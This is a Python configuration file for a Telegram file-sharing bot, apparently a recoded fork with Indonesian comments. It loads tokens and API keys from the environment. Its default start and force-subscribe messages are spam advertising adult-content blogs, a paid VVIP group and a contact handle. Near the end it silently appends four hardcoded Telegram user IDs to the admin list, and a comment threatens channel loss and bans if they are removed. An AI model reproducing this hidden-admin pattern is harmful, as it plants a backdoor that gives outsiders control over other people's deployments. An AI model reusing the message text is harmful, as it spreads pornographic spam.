# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database
DB_URI = os.environ.get("DATABASE_URL", "")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>👇[𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗦𝗜𝗧𝗨𝗦 𝗖𝗢𝗟𝗟𝗘𝗖𝗧𝗢𝗥]👇\n https://telegra.ph/SITUS-COLLECTOR-01-06\n\n👇 [ 𝗩𝗩𝗜𝗣 𝗖𝗢𝗟𝗘𝗖𝗧𝗢𝗥 ] 👇\n https://telegra.ph/VVIP-COLLECTOR-01-06 \n\n anda harus join chanel dan group yang ada pada tombol di bawah, Lalu klik coba lagi\n\ncapek klik link trus? sampai terkena limit? mending join vvip terlengkap kami cek di testi kami => https://t.me/testi_vvip_collector/72\n Mau join? hubungi => @dad_sex\n\n𝙏𝙃𝙀 𝘾𝙊𝙇𝙇𝙀𝘾𝙏𝙊𝙍 𝙋𝙍𝙊𝙅𝙀𝘾𝙏 𝙈𝙀𝙉𝙂𝙃𝘼𝘿𝙄𝙍𝙆𝘼𝙉!!\n𝙎𝙄𝙏𝙐𝙎 𝙒𝙀𝘽 𝘾𝙊𝙇𝙇𝙀𝘾𝙏𝙊𝙍\n\n•FILM SEMI DEWASA\n=> https://streamingsemiku.blogspot.com\n•SEMI JEPANG JAV\n=>https://semijepangjav.blogspot.com\n•ANIME HENTAI\n=>https://nekopoicol.blogspot.com\n•KOMIK DEWASA\n=>https://manhwacoldesu.blogspot.com\n•VIDEO ADULT\n=>https://viralbkpterbaru.blogspot.com\n• STUDIO COLLECTOR\n=> https://studiokucollector-19.blogspot.com \n\n•TUTORIAL NONTON\n=> https://t.me/tutorsituscollector/5\n\nClick in here👇👇\n=>https://s.id/Website_bochil_indo\n\nDeveloped by:\n<a href='https://t.me/+vwLf6fQUyqgyNmRl'>TENTANG SAYA</a>\nCreator by:\n<a href='https://t.me/+itziTCyvxX1mNzll'>@Creator</a></b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\n👇[𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝗦𝗜𝗧𝗨𝗦 𝗖𝗢𝗟𝗟𝗘𝗖𝗧𝗢𝗥]👇\n https://telegra.ph/SITUS-COLLECTOR-01-06\n\n👇 [ 𝗩𝗩𝗜𝗣 𝗖𝗢𝗟𝗘𝗖𝗧𝗢𝗥 ] 👇\n https://telegra.ph/VVIP-COLLECTOR-01-06 \n\n anda harus join chanel dan group yang ada pada tombol di bawah, Lalu klik coba lagi\n\ncapek klik link trus? sampai terkena limit? mending join vvip terlengkap kami cek di testi kami => https://t.me/testi_vvip_collector/72\n Mau join? hubungi => @dad_sex\n\n𝙏𝙃𝙀 𝘾𝙊𝙇𝙇𝙀𝘾𝙏𝙊𝙍 𝙋𝙍𝙊𝙅𝙀𝘾𝙏 𝙈𝙀𝙉𝙂𝙃𝘼𝘿𝙄𝙍𝙆𝘼𝙉!!\n𝙎𝙄𝙏𝙐𝙎 𝙒𝙀𝘽 𝘾𝙊𝙇𝙇𝙀𝘾𝙏𝙊𝙍\n\n•FILM SEMI DEWASA\n=> https://streamingsemiku.blogspot.com\n•SEMI JEPANG JAV\n=>https://semijepangjav.blogspot.com\n•ANIME HENTAI\n=>https://nekopoicol.blogspot.com\n•KOMIK DEWASA\n=>https://manhwacoldesu.blogspot.com\n•VIDEO ADULT\n=>https://viralbkpterbaru.blogspot.com\n• STUDIO COLLECTOR\n=> https://studiokucollector-19.blogspot.com \n\n•TUTORIAL NONTON\n=> https://t.me/tutorsituscollector/5\n\nClick in here👇👇\n=>https://s.id/Website_bochil_indo\n\nDeveloped by:\n<a href='https://t.me/+vwLf6fQUyqgyNmRl'>TENTANG SAYA</a>\nCreator by:\n<a href='https://t.me/+itziTCyvxX1mNzll'>@Creator</a></b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
